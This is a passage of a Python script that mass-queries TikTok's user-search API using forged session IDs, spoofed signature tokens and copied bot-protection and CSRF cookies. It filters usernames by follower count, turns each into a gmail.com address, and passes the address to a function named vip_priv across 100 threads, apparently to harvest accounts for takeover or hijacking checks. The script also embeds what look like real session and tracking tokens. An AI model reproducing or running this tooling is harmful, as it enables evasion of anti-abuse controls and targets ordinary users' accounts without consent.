                headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','cache-control':'no-cache','pragma':'no-cache','priority':'u=1, i','sec-ch-ua':'"Not)A;Brand";v="99","Microsoft Edge";v="127","Chromium";v="127"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':he3["User-Agent"]}
                params={'WebIdLastTime':'1715883147',    'aid':'1988','app_language':'en','app_name':'tiktok_web','browser_language':'en-US','browser_name':'Mozilla','browser_online':'true','browser_platform':'Win32','browser_version':he3["User-Agent"],'channel':'tiktok_web','cookie_enabled':'true','cursor':'220','data_collection_enabled':'false','device_id':idd6,'device_platform':'web_pc','focus_state':'true','from_page':'search','history_len':'5','is_fullscreen':'false','is_page_visible':'true','keyword':f'{keyword}','odinId':'7369661640164000774','os':'windows','priority_region':'','referer':'','region':'PE','screen_height':'864','screen_width':'1536','search_id':'20240801154310BA7846F9CDEDD312B464','tz_name':'Asia/Baghdad','user_is_login':'false','web_search_code':'{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}','webcast_language':'en','msToken':msToken,'X-Bogus':'DFSzswVLRekANHWvtvtx-ShPmkfD','_signature':'_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70'}
                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()               
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=10:
                    	pass
                    else:
                    	continue
                    if '_' in user:
                    	continue
                    else:
                    	pass
                    email=user+'@gmail.com'
                    vip_priv(email)                    	   
            except:pass
for i in range(100):
    threading.Thread(target=luffy_shelby).start()              

    